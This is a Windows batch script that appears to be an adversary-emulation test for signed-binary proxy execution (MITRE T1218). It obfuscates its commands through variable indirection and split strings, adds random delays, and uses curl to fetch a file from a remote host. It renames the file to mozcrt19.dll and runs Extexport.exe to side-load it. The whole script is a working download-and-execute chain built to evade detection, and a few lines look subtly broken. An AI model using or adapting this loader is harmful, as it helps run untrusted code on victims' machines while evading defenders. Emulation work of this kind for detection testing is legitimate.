@echo off
SETLOCAL EnableDelayedExpansion

REM PHR_ constants (plain literals - NEVER obfuscated)
SET yktnwwf=%APPDATA%\8024\55d1ae48
SET fpakbq=Macula-Stage0-8024
SET repbmqg=https://10.0.0.49
SET rdzgrnne=https://10.0.0.49/stage/2/icon.png?8024-7
SET omxgazu=BALAM-S2BO
SET yydue=7
SET edjwtl=firelox.txt
SET fpldhe=8024

REM Obfuscated variable setup
SET zxaeu=%APPDATA%\!yydue!
SET lptvr=%zxaeu!\macula-simulations.log
SET vbjhg=5
SET nbvxq=127.0.0.1
SET cfgtk=mozcrt19.dll

REM Multi-level variable indirection for LOLBINs
SET tqwmc=curl
SET rfhyn=tqwmc
SET mnbvk=Extexport.exe
SET qazws=mnbvk
SET edcrf=-k
SET tgbhy=-s
SET yhnuj=-o
SET ujmik=nul

REM Initial delay (45 seconds)
echo [!DATE! !TIME!][DEBUG][!omxgazu!]: Initial_delay_start>>> "!lptvr!" 2>nul
timeout /t 45 /nobreak >nul
echo [!DATE! !TIME!][DEBUG][!omxgazu!]: Initial_delay_complete>>> "!lptvr!" 2>nul

REM Create temp directory
echo [!DATE! !TIME!][DEBUG][!omxgazu!]: Creating_directory=!zxaeu!>>> "!lptvr!" 2>nul
IF NOT EXIST "!zxaeu!" mkdir "!zxaeu!" >nul 2>nul
SET fglpa=0
IF NOT EXIST "!zxaeu!" SET fglpa=1&SET kjoi3=create_dir_failed

REM Heartbeat check with obfuscated command
echo [!DATE! !TIME!][DEBUG][!omxgazu!]: Heartbeat_start=!rdzgrnne!>>> "!lptvr!" 2>nul
SET /A hdswk=!RANDOM! %% 15 + 5
ping -n !hdswk! !nbvxq! >nul

CALL SET uiopl=%%!rfhyn!%%
%uiopl% !edcrf! !tgbhy! !yhnuj! !ujmik! "!rdzgrnne!"
IF !ERRORLEVEL! NEQ 0 (
    SET fglpa=1
    SET kjoi3=heartbeat_timeout
    echo [!DATE! !TIME!][DEBUG][!omxgazu!]: Heartbeat_failed=!ERRORLEVEL!>>> "!lptvr!" 2>nul
) ELSE (
    echo [!DATE! !TIME!][DEBUG][!omxgazu!]: Heartbeat_success>>> "!lptvr!" 2>nul
)

REM Delay between operations
CHOICE /C Y /N /D Y /T 8 >nul

REM Build download command with variable fragmentation
SET prtql=h
SET wertc=ttp
SET ghjkl=://
SET dfghj=prtql
SET cvbnm=wertc
SET xcvbn=ghjkl

CALL SET bnmvc=%%!dfghj!%%
CALL SET mkoij=%%!cvbnm!%%
CALL SET polkm=%%!xcvbn!%%

SET /A rdelay=!RANDOM! %% 20 + 10
echo [!DATE! !TIME!][DEBUG][!omxgazu!]: Random_delay_start=!rdelay!s>>> "!lptvr!" 2>nul
timeout /t !rdelay! /nobreak >nul

REM Download file with obfuscated URL construction
echo [!DATE! !TIME!][DEBUG][!omxgazu!]: Download_start=!repbmqg!>>> "!lptvr!" 2>nul
SET zxcvb=!bnmvc!!mkoij!!polkm!
%uiopl% !edcrf! !tgbhy! !yhnuj! "!zxaeu!\!edjwtl!" "!repbmqg!"
IF !ERRORLEVEL! NEQ 0 (
    SET fglpa=1
    SET kjoi3=download_failed
    echo [!DATE! !TIME!][DEBUG][!omxgazu!]: Download_failed=!ERRORLEVEL!>>> "!lptvr!" 2>nul
) ELSE (
    echo [!DATE! !TIME!][DEBUG][!omxgazu!]: Download_complete>>> "!lptvr!" 2>nul
)

REM Delay before rename
ping -n 6 !nbvxq! >nul

REM Rename file
echo [!DATE! !TIME!][DEBUG][!omxgazu!]: Rename_start=!zxaeu!\!edjwtl!_to_!cfgtk!>>> "!lptvr!" 2>nul
IF EXIST "!zxaeu!\!edjwtl!" (
    RENAME "!zxaeu!\!edjwtl!" "!cfgtk!"
    IF !ERRORLEVEL! NEQ 0 (
        SET fglpa=1
        SET kjoi3=rename_failed
        echo [!DATE! !TIME!][DEBUG][!omxgazu!]: Rename_failed=!ERRORLEVEL!>>> "!lptvr!" 2>nul
    ) ELSE (
        echo [!DATE! !TIME!][DEBUG][!omxgazu!]: Rename_success>>> "!lptvr!" 2>nul
    )
) ELSE (
    SET fglpa=1
    SET kjoi3=source_missing
    echo [!DATE! !TIME!][DEBUG][!omxgazu!]: Source_file_missing>>> "!lptvr!" 2>nul
)

REM Final delay before execution
CHOICE /C Y /N /D Y /T 10 >nul

REM DLL execution with obfuscated binary reference
echo [!DATE! !TIME!][DEBUG][!omxgazu!]: DLL_execution_start>>> "!lptvr!" 2>nul
IF EXIST "!zxaeu!\!cfgtk!" (
    PUSHD "!zxaeu!"
    CALL SET trews=%%!qazws!%%
    !trews! "!zxaeu!" foo bar
    SET zxplm=!ERRORLEVEL!
    POPD
    
    IF !zxplm! NEQ 0 (
        SET fglpa=1
        SET kjoi3=assembly_load_failed
        echo [!DATE! !TIME!][DEBUG][!omxgazu!]: Execution_failed=!zxplm!>>> "!lptvr!" 2>nul
    ) ELSE (
        echo [!DATE! !TIME!][DEBUG][!omxgazu!]: Execution_success>>> "!lptvr!" 2>nul
    )
) ELSE (
    SET fglpa=1
    SET kjoi3=dll_missing
    echo [!DATE! !TIME!][DEBUG][!omxgazu!]: DLL_missing>>> "!lptvr!" 2>nul
)

REM TTP logging with normalized timestamp
SET xcvfr=!DATE!
SET vfrcx=!TIME!
SET mmnnb=!xcvfr:~10,4!-!xcvfr:~4,2!-!xcvfr:~7,2!
SET bbnnm=!vfrcx:~0,2!:!vfrcx:~3,2!:!vfrcx:~6,2!.!vfrcx:~9,3!

IF !fglpa! EQU 0 (
    SET hjklp=1
    SET qwert=
) ELSE (
    SET hjklp=0
    SET qwert=!kjoi3!
)

>> "!lptvr!" 2>nul echo [!mmnnb! !bbnnm!][!omxgazu!]: !yydue!-!fpldhe!-T1218^|Signed_Binary_Proxy_Execution=!hjklp!:!qwert!

echo [!DATE! !TIME!][DEBUG][!omxgazu!]: Script_complete>>> "!lptvr!" 2>nul